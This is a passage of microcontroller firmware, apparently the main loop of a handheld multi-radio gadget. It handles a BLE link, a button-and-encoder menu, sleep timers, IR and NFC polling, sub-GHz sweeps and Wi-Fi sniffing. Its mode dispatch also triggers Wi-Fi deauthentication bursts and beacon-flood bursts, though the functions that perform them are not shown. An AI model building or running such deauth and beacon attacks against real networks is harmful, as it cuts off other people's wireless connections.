  // BLE link gate: prompt the central once notifications should be up.
  if (linkNeedPending && connected && !linked && millis() >= linkNeedAt) {
    linkNeedPending = false;
    notifyLine("DATA:LINK:need\n");
  }

  // ---- crow UI input (encoder + select) ----
  fuHandleInput();

  // USER_KEY (GPIO6): short press = back, hold ~3s = deep sleep (press to wake).
  static uint32_t ukDown = 0; static bool ukHandled = false;
  if (digitalRead(USER_KEY) == LOW) {
    if (ukDown == 0) { ukDown = millis(); ukHandled = false; }
    else if (!ukHandled && millis() - ukDown > 3000) { ukHandled = true; enterSleep(); }
  } else {
    if (ukDown && !ukHandled) { fuBack(); fuLastInput = millis(); }
    ukDown = 0;
  }

  // auto-sleep after the configured idle timeout (not while a job is running)
  if (cfg.sleepMin > 0 && !uiActionActive && millis() - fuLastInput > (uint32_t)cfg.sleepMin * 60000UL) enterSleep();

#if ALLOW_TX
  if (txPending) { txPending = false; doTransmit(txFreq, txBits); }
#endif
  if (irRxOn) irRxPump();
  if (uiActionActive && nfcPolling) { static uint32_t tN = 0; if (millis() - tN > 700) { tN = millis(); nfcPoll(); } }

  bool host = hostUp();

  if (host && scanning) {
    wifiScanBroadcast();
    delay(40);
  } else if (host && subScan) {
    subghzRssiSweep();
    delay(30);
    if (subScan) rfDecodeWindow();
  } else if (host && snifferMode) {
    drainSniffer();
    static uint32_t lastPkt = 0;
    if (millis() - lastPkt > 1000) {
      lastPkt = millis();
      notifyLine("DATA:PKT:" + String(pktBeacons) + "," + String(pktDeauths) + "," +
                 String(pktProbes) + "," + String(pktData) + "\n");
    }
    delay(20);
  } else if (host && deauthRun) {
    sendDeauthBurst(); delay(50);
  } else if (host && beaconRun) {
    sendBeaconBurst(); delay(50);
  } else if (host && bleScanRun) {
    runBleScanPass();
  } else if (host && anaRun) {
    freqAnalyzer(); delay(120);
  } else {
    delay(16);
  }

  // ---- render (redraw on change; action screen refreshes for live log) ----
  static uint32_t lastDraw = 0;
  if (fuDirty) { fuRender(); fuDirty = false; fuRowsDirty = false; lastDraw = millis(); }
  else if (fuRowsDirty) { fuRenderRows(); fuRowsDirty = false; }
  else if (fuScr == S_ACTION && millis() - lastDraw > 350) { fuDrawActionLog(); lastDraw = millis(); }

  static uint32_t lastStat = 0;
  if (millis() - lastStat > 2000) { lastStat = millis(); setStatus(op.c_str()); }
}
